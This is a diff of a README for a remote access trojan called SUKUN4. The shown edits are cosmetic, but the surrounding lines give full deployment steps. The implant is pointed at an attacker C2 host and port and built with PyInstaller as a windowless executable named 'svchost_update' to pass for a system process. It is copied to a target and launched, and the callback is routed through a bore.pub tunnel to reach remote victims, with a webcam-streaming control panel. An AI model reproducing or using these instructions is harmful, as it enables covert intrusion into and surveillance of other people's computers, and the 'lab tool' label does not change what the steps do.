@@ -41,32 +41,32 @@ python -m venv .venv
 pip install -r requirements-attacker.txt
 python attacker.py
 
-text
+**text**
 
 A window titled **SUKUN4** opens: banner at top, live webcam panel (hidden until `webcam_stream`), color-tagged output in the middle, command entry at the bottom. The title bar shows the current session host.
 
 ### implant
 
 Edit `implant.py`:
-C2_HOST = "192.168.1.50" # attacker LAN IP, or tunnel host
+C2_HOST = "192.1x.x.x" # attacker LAN IP, or tunnel host
 C2_PORT = 54321 # must match PORT in attacker.py
 
 text
 
-Build:
+**Build**:
 ..venv\Scripts\pip install -r requirements-implant.txt
 ..venv\Scripts\python.exe -m PyInstaller --onefile --noconsole --name svchost_update ^
 --hidden-import PIL.ImageGrab --collect-all PIL ^
 --hidden-import cv2 --collect-all cv2 ^
 implant.py
 
-text
+**exe*
 
 Output: `dist\svchost_update.exe`. Copy to target, launch, wait for `session <ip>:<port> open` in the GUI.
 
 ### testing over the internet
 
-Same-LAN `C2_HOST` values (`192.168.x.x`) do not route across networks. For a remote target, forward a local TCP port with a tunnel and point `C2_HOST` / `C2_PORT` at the tunnel's public host:port. `bore local 54321 --to bore.pub` prints a `listening at bore.pub:PORT` line — that pair is the build-time endpoint. The port rotates per tunnel restart.
+Same-LAN `C2_HOST` values (`192.168.x.x`) do not route across networks. For a remote target, forward a local TCP port with a tunnel and point `C2_HOST` / `C2_PORT` at the tunnel's public host:port. I use `bore local 54321 --to bore.pub` prints a `listening at bore.pub:PORT` line — that pair is the build-time endpoint. The port rotates per tunnel restart.
 
 ---
 
@@ -119,4 +119,4 @@ SUKUN4 is a **lab tool**. Using it against systems you do not own, or do not hav
 
 ---
 
-*built by thuli_0x*
+*built by thuli3xplt*
